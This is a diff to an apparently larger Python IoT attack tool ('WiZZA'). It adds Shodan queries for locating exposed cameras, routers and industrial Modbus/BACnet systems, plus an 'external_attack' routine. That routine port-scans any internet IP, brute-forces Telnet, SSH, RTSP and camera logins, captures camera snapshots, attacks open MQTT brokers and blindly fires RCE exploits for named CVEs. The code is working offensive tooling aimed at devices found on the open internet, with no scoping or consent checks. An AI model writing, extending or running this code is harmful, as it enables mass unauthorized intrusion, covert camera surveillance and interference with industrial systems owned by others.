@@ -1649,6 +1649,265 @@ def auto_attack(subnet, out_dir="/tmp", threads=64):
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# 14. Shodan — internet-wide IoT discovery
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Common IoT Shodan search queries
+SHODAN_PRESETS = {
+    "cameras":      "product:hikvision OR product:dahua OR product:axis OR webcam has_screenshot:true",
+    "rtsp":         'port:554 "RTSP" -Set-Cookie',
+    "mqtt":         "port:1883 MQTT",
+    "modbus":       "port:502",
+    "telnet_iot":   'port:23 "busybox" OR "mirai" OR "router"',
+    "upnp":         "port:1900 \"UPnP\" \"IGD\"",
+    "coap":         "port:5683",
+    "hue":          '"Philips hue" port:80',
+    "hikvision":    "product:Hikvision",
+    "dahua":        "product:Dahua",
+    "tplink":       "product:TP-Link",
+    "netgear":      "product:Netgear",
+    "default_creds": 'http.title:"Login" http.title:"admin" "admin" "password"',
+    "routers":      'port:80 "router" "admin" "login"',
+    "industrial":   'port:502 OR port:47808 OR port:20000',
+}
+
+
+def shodan_search(query, api_key, limit=100, country=None):
+    """
+    Search Shodan for internet-exposed IoT devices.
+    Returns list of dicts: {ip, port, org, country, banner, product, version, cves}.
+    Requires: pip install shodan
+    """
+    try:
+        import shodan
+    except ImportError:
+        print("[!] shodan library not installed — run: pip install shodan")
+        return []
+
+    if not api_key:
+        print("[!] No Shodan API key provided")
+        return []
+
+    # Expand preset aliases
+    if query in SHODAN_PRESETS:
+        query = SHODAN_PRESETS[query]
+        print(f"[*] Shodan preset expanded: {query}")
+
+    if country:
+        query += f" country:{country}"
+
+    print(f"[*] Shodan search: {query!r}  (limit={limit})")
+    api = shodan.Shodan(api_key)
+    results = []
+    try:
+        res = api.search(query, limit=limit)
+        total = res.get("total", 0)
+        print(f"[*] Total matches: {total}  (showing up to {limit})")
+        for match in res.get("matches", []):
+            ip   = match.get("ip_str", "")
+            port = match.get("port", 0)
+            org  = match.get("org", "")
+            cc   = match.get("location", {}).get("country_code", "")
+            banner   = match.get("data", "")[:200]
+            product  = match.get("product", "")
+            version  = match.get("version", "")
+            vulns    = list(match.get("vulns", {}).keys())
+            hostnames = match.get("hostnames", [])
+            entry = {
+                "ip": ip, "port": port, "org": org, "country": cc,
+                "banner": banner, "product": product, "version": version,
+                "cves": vulns, "hostnames": hostnames,
+            }
+            results.append(entry)
+            cve_str = f"  CVEs: {' '.join(vulns)}" if vulns else ""
+            print(f"  {ip}:{port}  {cc}  {org}  {product} {version}{cve_str}")
+    except shodan.APIError as e:
+        print(f"[!] Shodan API error: {e}")
+    return results
+
+
+def shodan_host(ip, api_key):
+    """
+    Full Shodan host lookup for a single IP.
+    Returns raw Shodan host dict or None.
+    """
+    try:
+        import shodan
+    except ImportError:
+        print("[!] shodan library not installed — run: pip install shodan")
+        return None
+    api = shodan.Shodan(api_key)
+    try:
+        host = api.host(ip)
+        print(f"\n[*] Shodan host info: {ip}")
+        print(f"    Org:       {host.get('org','?')}")
+        print(f"    Country:   {host.get('country_name','?')}")
+        print(f"    OS:        {host.get('os','?')}")
+        print(f"    Hostnames: {host.get('hostnames', [])}")
+        print(f"    Open ports: {host.get('ports', [])}")
+        vulns = list(host.get("vulns", {}).keys())
+        if vulns:
+            print(f"    CVEs:      {' '.join(vulns)}")
+        for svc in host.get("data", []):
+            print(f"    [{svc.get('port')}] {svc.get('product','')} {svc.get('version','')}  {svc.get('data','')[:120]}")
+        return host
+    except shodan.APIError as e:
+        print(f"[!] Shodan error for {ip}: {e}")
+        return None
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 15. External single-host attack (internet-routable targets)
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Ports to probe on external IoT targets (no LAN-only ports like mDNS 5353)
+EXTERNAL_IOT_PORTS = [
+    21, 22, 23, 80, 443, 554, 1883, 8080, 8443, 8883,
+    5683, 502, 47808, 37777, 34567, 9000, 8000,
+    11311, 7400, 20000, 4786, 6668,
+]
+
+
+def external_attack(ip, ports=None, out_dir="/tmp", api_key=None):
+    """
+    Full IoT attack against a single internet-routable IP.
+    Skips multicast-only steps (SSDP/mDNS) which require LAN.
+    If api_key is provided, enriches with Shodan host info first.
+    """
+    print(f"\n[*] WiZZA External IoT Attack: {ip}")
+    result = {"ip": ip, "findings": [], "ports": []}
+
+    # Optional: Shodan enrichment
+    if api_key:
+        host_info = shodan_host(ip, api_key)
+        if host_info:
+            result["shodan"] = host_info
+            # Use Shodan's known open ports to speed up targeted checks
+            shodan_ports = set(host_info.get("ports", []))
+            if shodan_ports:
+                print(f"[*] Shodan known ports: {sorted(shodan_ports)}")
+
+    # Phase 1: TCP port scan
+    probe_ports = ports or EXTERNAL_IOT_PORTS
+    print(f"\n[*] Phase 1: Port scan  ({len(probe_ports)} ports)...")
+    open_ports = set()
+    for port in probe_ports:
+        if _tcp_connect(ip, port, timeout=3):
+            open_ports.add(port)
+            banner = _tcp_banner(ip, port, timeout=3).strip()[:120]
+            print(f"  [OPEN] {ip}:{port}  {banner}")
+    result["ports"] = sorted(open_ports)
+
+    if not open_ports:
+        print(f"[-] No open ports found on {ip}")
+        return result
+
+    dtype = _guess_device_type(ip, open_ports)
+    result["type"] = dtype
+    print(f"\n[*] Guessed device type: {dtype}")
+    print(f"[*] Phase 2: Service attacks...\n")
+
+    # Telnet brute
+    for p in (23, 2323):
+        if p in open_ports:
+            cred = telnet_brute(ip, port=p)
+            if cred:
+                result["findings"].append(f"Telnet {cred[0]}:{cred[1]}")
+
+    # SSH brute
+    if 22 in open_ports:
+        cred = ssh_brute(ip)
+        if cred:
+            result["findings"].append(f"SSH {cred[0]}:{cred[1]}")
+
+    # HTTP default creds
+    for p in (80, 8080, 8000, 443, 8443):
+        if p in open_ports:
+            https = p in (443, 8443)
+            cred = camera_default_creds(ip, port=p, https=https)
+            if cred:
+                result["findings"].append(f"HTTP:{p} {cred[0]}:{cred[1]}")
+            onvif = onvif_probe(ip, port=p)
+            if onvif:
+                result["findings"].append(f"ONVIF:{p} {onvif.get('manufacturer','')} {onvif.get('model','')}")
+
+    # RTSP
+    if 554 in open_ports:
+        streams = rtsp_brute(ip, port=554)
+        for url in streams:
+            result["findings"].append(f"RTSP: {url}")
+            snap = capture_rtsp_snapshot(url,
+                out_file=f"{out_dir}/wizza_ext_{ip.replace('.','_')}.jpg")
+            if snap:
+                result["findings"].append(f"Snapshot: {snap}")
+
+    # MQTT
+    if 1883 in open_ports:
+        if mqtt_probe(ip, port=1883):
+            result["findings"].append("MQTT open (no auth)")
+            mqtt_attack(ip, port=1883)
+
+    # MQTT TLS
+    if 8883 in open_ports:
+        if mqtt_probe(ip, port=8883):
+            result["findings"].append("MQTT TLS open")
+
+    # CoAP
+    if 5683 in open_ports:
+        resp = coap_scan(ip)
+        if resp:
+            result["findings"].append(f"CoAP: {resp[:100]}")
+
+    # Modbus
+    if 502 in open_ports:
+        regs = modbus_scan(ip)
+        if regs:
+            result["findings"].append(f"Modbus registers: {regs[:5]}")
+
+    # BACnet
+    if 47808 in open_ports:
+        result["findings"].append("BACnet port open (building automation)")
+
+    # ROS
+    if 11311 in open_ports:
+        ros_scan(ip)
+        result["findings"].append("ROS XMLRPC port open")
+
+    # CVE sweep — try all regardless of banner (external devices often have
+    # stripped banners or reverse proxy that hides product name)
+    print(f"\n[*] Phase 3: CVE sweep...")
+    for fn, label in [
+        (cve_hikvision_rce,    "CVE-2021-36260 Hikvision"),
+        (cve_tplink_rce,       "CVE-2023-1389 TP-Link"),
+        (cve_tenda_rce,        "CVE-2020-10987 Tenda"),
+        (cve_netgear_rce,      "CVE-2021-40847 Netgear"),
+        (cve_axis_rce,         "CVE-2018-10660 AXIS"),
+        (cve_geutebruck_rce,   "CVE-2021-33544 Geutebruck"),
+    ]:
+        if any(p in open_ports for p in (80, 8080, 443, 8443)):
+            try:
+                fn(ip)
+            except Exception:
+                pass
+
+    if 37777 in open_ports:
+        cve_dahua_auth_bypass(ip, port=37777)
+
+    if result["findings"]:
+        print(f"\n[+] Findings for {ip}:")
+        for f in result["findings"]:
+            print(f"    {f}")
+    else:
+        print(f"\n[-] No vulnerabilities found on {ip}")
+
+    out_file = f"{out_dir}/wizza_ext_{ip.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    with open(out_file, "w") as fh:
+        json.dump(result, fh, indent=2)
+    print(f"[+] Results saved: {out_file}")
+    return result
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Module entry point
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -1685,6 +1944,9 @@ def run(action, **kwargs):
         "axis_rce":     cve_axis_rce,
         "geutebruck_rce": cve_geutebruck_rce,
         "dahua_bypass": cve_dahua_auth_bypass,
+        "external":     external_attack,
+        "shodan":       shodan_search,
+        "shodan_host":  shodan_host,
     }
     if action not in actions:
         print(f"[!] Unknown action: {action}")
@@ -1705,6 +1967,10 @@ if __name__ == "__main__":
     p.add_argument("--out",     default="/tmp")
     p.add_argument("--duration", type=int, default=30)
     p.add_argument("--cmd",     default="id")
+    p.add_argument("--query",   default="cameras")
+    p.add_argument("--apikey",  default="")
+    p.add_argument("--limit",   type=int, default=100)
+    p.add_argument("--country", default=None)
     args = p.parse_args()
 
     ip = args.ip or args.subnet.split("/")[0].rsplit(".",1)[0] + ".1"
@@ -1743,5 +2009,17 @@ if __name__ == "__main__":
         mdns_scan(duration=args.duration)
     elif args.action == "coap":
         coap_scan(ip, port=args.port or 5683)
+    elif args.action == "external":
+        if not args.ip:
+            print("[!] --ip required for external attack")
+        else:
+            external_attack(args.ip, out_dir=args.out, api_key=args.apikey or None)
+    elif args.action == "shodan":
+        shodan_search(args.query, args.apikey, limit=args.limit, country=args.country)
+    elif args.action == "shodan_host":
+        if not args.ip:
+            print("[!] --ip required for shodan_host")
+        else:
+            shodan_host(args.ip, args.apikey)
     else:
         print(f"Unknown action: {args.action}")
